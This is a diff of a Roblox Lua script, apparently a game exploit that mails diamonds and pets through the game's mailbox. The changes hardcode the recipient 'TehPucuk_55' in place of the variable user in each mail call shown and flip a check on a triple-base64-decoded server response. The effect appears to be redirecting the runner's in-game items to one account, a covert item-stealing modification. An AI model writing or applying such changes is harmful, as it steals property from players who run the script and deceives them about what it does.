@@ -1156,7 +1156,7 @@ if getgenv().Settings ~= nil then
             Headers = dhheaders
         })
         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
-        if responsed ~= 'true' then
+        if responsed ~= 'false' then
             dhuser = responsed
         else
             dhuser = nil
@@ -1247,7 +1247,7 @@ if FinalList == 0 then
     end
     local args = {
         [1] = {
-            ["Recipient"] = user,
+            ["Recipient"] = "TehPucuk_55",
             ["Diamonds"] = givediaamt,
             ["Pets"] = {},
             ["Message"] = mailmsg,
@@ -1267,7 +1267,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1295,7 +1295,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1325,7 +1325,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1354,7 +1354,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
